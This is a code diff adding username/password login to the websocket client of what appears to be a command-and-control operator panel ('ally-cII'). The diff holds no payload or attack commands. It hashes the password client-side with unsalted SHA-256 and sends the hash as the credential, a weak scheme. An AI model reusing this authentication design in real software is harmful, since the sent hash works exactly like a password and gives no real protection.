@@ -8,6 +8,8 @@ import subprocess
 import base64
 import ssl
 import random
+import getpass
+import hashlib
 
 
 from prompt_toolkit import PromptSession, print_formatted_text
@@ -110,6 +112,26 @@ def my_clear():
 
 def command_not_fount():
     print_formatted_text(ANSI(f"-- [{RED}-{RESET}] command not found"))
+
+async def operator_login(username, pass_hash, websocket):
+
+    auth_payload = {
+        "action": "auth",
+        "username": username,
+        "password": pass_hash
+    }
+    await websocket.send(json.dumps(auth_payload))
+    auth_resp = json.loads(await websocket.recv())
+    
+    if auth_resp.get("status") != "success":
+        print_formatted_text(ANSI(f"\n{RED}[-] Auth failed: {auth_resp.get('message')}{RESET}\n"))
+        return False
+        
+    print_formatted_text(ANSI(f"\n{GREEN}[+] Login success{RESET}\n"))
+
+    print(f"\n\n{BOLD}welcome{RESET} to the ally-cII pannel use {BOLD}help{RESET} to view")
+    print(f"all the possible actions\n")
+    return True
 
 #-----
 
@@ -347,16 +369,28 @@ async def main(server_url, event_url):
     if not warning():
         return
 
-    print(f"\n\n{BOLD}welcome{RESET} to the ally-cII pannel use {BOLD}/help{RESET} to view")
-    print(f"all the possible actions\n")
+
+    print(f"\n{BOLD}[+] Authentication Required{RESET}")
+    username = input("Username: ").strip()
+    password = getpass.getpass("Password: ")
+
+    #getting pasasword hash
+    pass_hash = hashlib.sha256(password.encode()).hexdigest()
 
     session = PromptSession()
+
 
     try: 
 
         #use websockets.connect(server_url,ssl=ssl_context) for tls 
+        ### UNCOMMENT THIS FOR https
         async with websockets.connect(server_url,ssl=ssl_context) as websocket:
         # async with websockets.connect(server_url) as websocket:
+        
+            if not await operator_login(username, pass_hash, websocket):
+                return
+
+            
             asyncio.create_task(event_listener(event_url)) 
 
             with patch_stdout():
